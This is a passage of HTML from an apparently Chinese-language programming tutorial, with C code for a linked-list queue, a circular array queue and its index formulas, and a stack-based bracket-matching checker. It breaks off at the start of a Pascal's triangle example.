class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-comment">// 定义链表节点</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span> &#123;<br>    <span class="hljs-type">int</span> data;           <span class="hljs-comment">// 存储数据</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span> *next;  <span class="hljs-comment">// 指向下一个节点的指针</span><br>&#125; Node;<br><br><span class="hljs-comment">// 定义链表队列结构</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Queue</span> &#123;<br>    Node *front;  <span class="hljs-comment">// 队列头指针</span><br>    Node *rear;   <span class="hljs-comment">// 队列尾指针</span><br>&#125; Queue;<br><br><span class="hljs-comment">// 初始化队列</span><br><span class="hljs-function">Queue* <span class="hljs-title">InitQueue</span><span class="hljs-params">()</span> </span>&#123;<br>    Queue *queue = (Queue*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(Queue));<br>    <span class="hljs-keyword">if</span> (queue == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;内存分配失败\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    queue-&gt;front = <span class="hljs-literal">NULL</span>;<br>    queue-&gt;rear = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> queue;<br>&#125;<br><br><span class="hljs-comment">// 判断队列是否为空</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">IsEmpty</span><span class="hljs-params">(Queue *queue)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> queue-&gt;front == <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-comment">// 入队操作</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Enqueue</span><span class="hljs-params">(Queue *queue, <span class="hljs-type">int</span> value)</span> </span>&#123;<br>    Node *newNode = (Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(Node)); <span class="hljs-comment">// 创建新节点</span><br>    <span class="hljs-keyword">if</span> (newNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;内存分配失败\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    newNode-&gt;data = value;<br>    newNode-&gt;next = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsEmpty</span>(queue)) &#123;<br>        queue-&gt;front = newNode;<br>        queue-&gt;rear = newNode;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        queue-&gt;rear-&gt;next = newNode;<br>        queue-&gt;rear = newNode;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 出队操作</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Dequeue</span><span class="hljs-params">(Queue *queue)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsEmpty</span>(queue)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;队列为空，无法删除元素\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    Node *temp = queue-&gt;front;<br>    <span class="hljs-type">int</span> value = temp-&gt;data;<br>    queue-&gt;front = queue-&gt;front-&gt;next;<br>    <span class="hljs-keyword">if</span> (queue-&gt;front == <span class="hljs-literal">NULL</span>) &#123;<br>        queue-&gt;rear = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// 如果队列变空，更新尾指针</span><br>    &#125;<br>    <span class="hljs-built_in">free</span>(temp);<br>    <span class="hljs-keyword">return</span> value;<br>&#125;<br><br><span class="hljs-comment">// 获取队列头部元素</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">GetFront</span><span class="hljs-params">(Queue *queue)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsEmpty</span>(queue)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;队列为空，无法获取元素\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> queue-&gt;front-&gt;data;<br>&#125;<br><br><span class="hljs-comment">// 打印队列内容</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PrintQueue</span><span class="hljs-params">(Queue *queue)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsEmpty</span>(queue)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;队列为空\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    Node *p = queue-&gt;front;<br>    <span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d -&gt; &quot;</span>, p-&gt;data);<br>        p = p-&gt;next;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;NULL\n&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    Queue *queue = <span class="hljs-built_in">InitQueue</span>(); <span class="hljs-comment">// 初始化队列</span><br><br>    <span class="hljs-comment">// 入队一些元素</span><br>    <span class="hljs-built_in">Enqueue</span>(queue, <span class="hljs-number">10</span>);<br>    <span class="hljs-built_in">Enqueue</span>(queue, <span class="hljs-number">20</span>);<br>    <span class="hljs-built_in">Enqueue</span>(queue, <span class="hljs-number">30</span>);<br>    <span class="hljs-built_in">Enqueue</span>(queue, <span class="hljs-number">40</span>);<br><br>    <span class="hljs-comment">// 打印队列内容</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;队列内容为：&quot;</span>);<br>    <span class="hljs-built_in">PrintQueue</span>(queue);<br><br>    <span class="hljs-comment">// 出队一个元素</span><br>    <span class="hljs-type">int</span> dequeuedValue = <span class="hljs-built_in">Dequeue</span>(queue);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;出队的元素为：%d\n&quot;</span>, dequeuedValue);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;出队后队列内容为：&quot;</span>);<br>    <span class="hljs-built_in">PrintQueue</span>(queue);<br><br>    <span class="hljs-comment">// 获取队列头部元素</span><br>    <span class="hljs-type">int</span> frontValue = <span class="hljs-built_in">GetFront</span>(queue);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;队列头部元素为：%d\n&quot;</span>, frontValue);<br><br>    <span class="hljs-comment">// 释放队列内存</span><br>    <span class="hljs-keyword">while</span> (!<span class="hljs-built_in">IsEmpty</span>(queue)) &#123;<br>        <span class="hljs-built_in">Dequeue</span>(queue);<br>    &#125;<br>    <span class="hljs-built_in">free</span>(queue);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><h4 id="循环队列"><a href="#循环队列" class="headerlink" title="循环队列"></a>循环队列</h4><p>循环队列是队列的一种变形，它使用数组实现，并通过将队尾指针和队头指针进行“环绕”处理，以有效利用数组空间。以下是循环队列的进队和出队操作。把存储队列元素的表从逻辑上视为一个环。</p><p><code>rear</code> 指针总是指向一个空位置<strong>，这就是为什么循环队列总会有一个空位置的原因。这个设计目的是为了区分</strong>队列为空<strong>和</strong>队列已满**的状态。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_SIZE 100 <span class="hljs-comment">// 队列的最大容量</span></span><br><br><span class="hljs-comment">// 定义循环队列结构</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Queue</span> &#123;<br>    <span class="hljs-type">int</span> data[MAX_SIZE]; <span class="hljs-comment">// 用数组存储队列元素</span><br>    <span class="hljs-type">int</span> front;          <span class="hljs-comment">// 队列头索引</span><br>    <span class="hljs-type">int</span> rear;           <span class="hljs-comment">// 队列尾索引</span><br>&#125; Queue;<br><br><span class="hljs-comment">// 初始化队列</span><br><span class="hljs-function">Queue* <span class="hljs-title">InitQueue</span><span class="hljs-params">()</span> </span>&#123;<br>    Queue *queue = (Queue*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(Queue));<br>    <span class="hljs-keyword">if</span> (queue == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;内存分配失败\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    queue-&gt;front = <span class="hljs-number">0</span>;<br>    queue-&gt;rear = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> queue;<br>&#125;<br><br><span class="hljs-comment">// 判断队列是否为空</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">IsEmpty</span><span class="hljs-params">(Queue *queue)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> queue-&gt;front == queue-&gt;rear;<br>&#125;<br><br><span class="hljs-comment">// 判断队列是否已满</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">IsFull</span><span class="hljs-params">(Queue *queue)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> (queue-&gt;rear + <span class="hljs-number">1</span>) % MAX_SIZE == queue-&gt;front;<br>&#125;<br><br><span class="hljs-comment">// 入队操作</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Enqueue</span><span class="hljs-params">(Queue *queue, <span class="hljs-type">int</span> value)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsFull</span>(queue)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;队列已满，无法插入元素\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    queue-&gt;data[queue-&gt;rear] = value;<br>    queue-&gt;rear = (queue-&gt;rear + <span class="hljs-number">1</span>) % MAX_SIZE;<br>&#125;<br><br><span class="hljs-comment">// 出队操作</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Dequeue</span><span class="hljs-params">(Queue *queue)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsEmpty</span>(queue)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;队列为空，无法删除元素\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-type">int</span> value = queue-&gt;data[queue-&gt;front];<br>    queue-&gt;front = (queue-&gt;front + <span class="hljs-number">1</span>) % MAX_SIZE;<br>    <span class="hljs-keyword">return</span> value;<br>&#125;<br><br><span class="hljs-comment">// 获取队列头部元素</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">GetFront</span><span class="hljs-params">(Queue *queue)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsEmpty</span>(queue)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;队列为空，无法获取元素\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> queue-&gt;data[queue-&gt;front];<br>&#125;<br><br><span class="hljs-comment">// 打印队列内容</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PrintQueue</span><span class="hljs-params">(Queue *queue)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsEmpty</span>(queue)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;队列为空\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> i = queue-&gt;front;<br>    <span class="hljs-keyword">while</span> (i != queue-&gt;rear) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d -&gt; &quot;</span>, queue-&gt;data[i]);<br>        i = (i + <span class="hljs-number">1</span>) % MAX_SIZE;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;NULL\n&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    Queue *queue = <span class="hljs-built_in">InitQueue</span>(); <span class="hljs-comment">// 初始化队列</span><br><br>    <span class="hljs-comment">// 入队一些元素</span><br>    <span class="hljs-built_in">Enqueue</span>(queue, <span class="hljs-number">10</span>);<br>    <span class="hljs-built_in">Enqueue</span>(queue, <span class="hljs-number">20</span>);<br>    <span class="hljs-built_in">Enqueue</span>(queue, <span class="hljs-number">30</span>);<br>    <span class="hljs-built_in">Enqueue</span>(queue, <span class="hljs-number">40</span>);<br><br>    <span class="hljs-comment">// 打印队列内容</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;队列内容为：&quot;</span>);<br>    <span class="hljs-built_in">PrintQueue</span>(queue);<br><br>    <span class="hljs-comment">// 出队一个元素</span><br>    <span class="hljs-type">int</span> dequeuedValue = <span class="hljs-built_in">Dequeue</span>(queue);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;出队的元素为：%d\n&quot;</span>, dequeuedValue);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;出队后队列内容为：&quot;</span>);<br>    <span class="hljs-built_in">PrintQueue</span>(queue);<br><br>    <span class="hljs-comment">// 获取队列头部元素</span><br>    <span class="hljs-type">int</span> frontValue = <span class="hljs-built_in">GetFront</span>(queue);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;队列头部元素为：%d\n&quot;</span>, frontValue);<br><br>    <span class="hljs-comment">// 释放队列内存</span><br>    <span class="hljs-built_in">free</span>(queue);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="循环队列中的关键公式与要点总结"><a href="#循环队列中的关键公式与要点总结" class="headerlink" title="循环队列中的关键公式与要点总结"></a>循环队列中的关键公式与要点总结</h5><ol><li>初始状态</li></ol><p>[ Q_front &#x3D; Q_rear &#x3D; 0 ]</p><ul><li>队首指针 <strong><code>Q_front</code></strong> 和队尾指针 <strong><code>Q_rear</code></strong> 都初始化为 <code>0</code>，表示队列为空。</li></ul><ol start="2"><li>队首指针进 1（出队操作）</li></ol><p>[ Q_front &#x3D; (Q_front + 1) % MaxSize ]</p><ul><li>当有元素出队时，队首指针 <strong><code>Q_front</code></strong> 向前移动一位，使用取模操作 <strong><code>% MaxSize</code></strong> 确保它可以循环到数组的开头。</li></ul><ol start="3"><li>队尾指针进 1（入队操作）</li></ol><p>[ Q_rear &#x3D; (Q_rear + 1) % MaxSize ]</p><ul><li>当有新元素入队时，队尾指针 <strong><code>Q_rear</code></strong> 向前移动一位，取模操作 <strong><code>% MaxSize</code></strong> 确保它可以循环到数组的开头。</li></ul><ol start="4"><li>队列长度计算公式</li></ol><p>[ \text{元素个数} &#x3D; (Q_rear + MaxSize - Q_front) % MaxSize ]</p><ul><li>该公式用于计算当前队列中的元素个数。</li><li><strong><code>(Q_rear + MaxSize - Q_front)</code></strong> 用于计算 <code>rear</code> 和 <code>front</code> 之间的距离，无论它们的位置关系如何。</li><li><strong>取模操作</strong> <strong><code>% MaxSize</code></strong> 确保结果在合法范围内。</li></ul><ol start="5"><li>队列状态判断</li></ol><ul><li><strong>队列为空</strong>：当 <code>Q_front == Q_rear</code> 时，表示队列为空。</li><li><strong>队列已满</strong>：当 <code>(Q_rear + 1) % MaxSize == Q_front</code> 时，表示队列已满（保留了一个空位置用于区分空和满的状态）。</li></ul><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_SIZE 100 <span class="hljs-comment">// 栈的最大容量</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>    <span class="hljs-type">char</span> data[MAX_SIZE]; <span class="hljs-comment">// 存储栈中元素的数组</span><br>    <span class="hljs-type">int</span> top;             <span class="hljs-comment">// 栈顶指针</span><br>&#125; Stack;<br><br><span class="hljs-comment">// 初始化栈</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">InitStack</span><span class="hljs-params">(Stack *stack)</span> </span>&#123;<br>    stack-&gt;top = <span class="hljs-number">-1</span>; <span class="hljs-comment">// 初始化为空栈</span><br>&#125;<br><br><span class="hljs-comment">// 判断栈是否为空</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">IsEmpty</span><span class="hljs-params">(Stack *stack)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> stack-&gt;top == <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-comment">// 判断栈是否已满</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">IsFull</span><span class="hljs-params">(Stack *stack)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> stack-&gt;top == MAX_SIZE - <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// 入栈操作</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Push</span><span class="hljs-params">(Stack *stack, <span class="hljs-type">char</span> value)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsFull</span>(stack)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// 栈满，入栈失败</span><br>    &#125;<br>    stack-&gt;data[++stack-&gt;top] = value; <span class="hljs-comment">// 先将栈顶指针加1，再存入元素</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// 出栈操作</span><br><span class="hljs-function"><span class="hljs-type">char</span> <span class="hljs-title">Pop</span><span class="hljs-params">(Stack *stack)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsEmpty</span>(stack)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;\0&#x27;</span>; <span class="hljs-comment">// 栈空，返回特殊字符</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> stack-&gt;data[stack-&gt;top--]; <span class="hljs-comment">// 取出栈顶元素，并将栈顶指针减1</span><br>&#125;<br><br><span class="hljs-comment">// 查看栈顶元素</span><br><span class="hljs-function"><span class="hljs-type">char</span> <span class="hljs-title">Peek</span><span class="hljs-params">(Stack *stack)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsEmpty</span>(stack)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;\0&#x27;</span>; <span class="hljs-comment">// 栈空，返回特殊字符</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> stack-&gt;data[stack-&gt;top];<br>&#125;<br><br><span class="hljs-comment">// 检查括号是否匹配</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">IsMatchingPair</span><span class="hljs-params">(<span class="hljs-type">char</span> left, <span class="hljs-type">char</span> right)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> (left == <span class="hljs-string">&#x27;(&#x27;</span> &amp;&amp; right == <span class="hljs-string">&#x27;)&#x27;</span>) ||<br>           (left == <span class="hljs-string">&#x27;&#123;&#x27;</span> &amp;&amp; right == <span class="hljs-string">&#x27;&#125;&#x27;</span>) ||<br>           (left == <span class="hljs-string">&#x27;[&#x27;</span> &amp;&amp; right == <span class="hljs-string">&#x27;]&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// 判断括号字符串是否匹配</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">AreParenthesesBalanced</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *expr)</span> </span>&#123;<br>    Stack stack;<br>    <span class="hljs-built_in">InitStack</span>(&amp;stack);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(expr); i++) &#123;<br>        <span class="hljs-type">char</span> ch = expr[i];<br><br>        <span class="hljs-comment">// 如果是左括号，入栈</span><br>        <span class="hljs-keyword">if</span> (ch == <span class="hljs-string">&#x27;(&#x27;</span> || ch == <span class="hljs-string">&#x27;&#123;&#x27;</span> || ch == <span class="hljs-string">&#x27;[&#x27;</span>) &#123;<br>            <span class="hljs-built_in">Push</span>(&amp;stack, ch);<br>        &#125;<br>        <span class="hljs-comment">// 如果是右括号，检查栈顶元素是否匹配</span><br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ch == <span class="hljs-string">&#x27;)&#x27;</span> || ch == <span class="hljs-string">&#x27;&#125;&#x27;</span> || ch == <span class="hljs-string">&#x27;]&#x27;</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsEmpty</span>(&amp;stack) || !<span class="hljs-built_in">IsMatchingPair</span>(<span class="hljs-built_in">Pop</span>(&amp;stack), ch)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// 不匹配</span><br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 最后检查栈是否为空</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">IsEmpty</span>(&amp;stack);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *expr = <span class="hljs-string">&quot;&#123;[()]&#125;&quot;</span>;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">AreParenthesesBalanced</span>(expr)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;括号匹配成功\n&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;括号不匹配\n&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>生成杨辉三角</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span 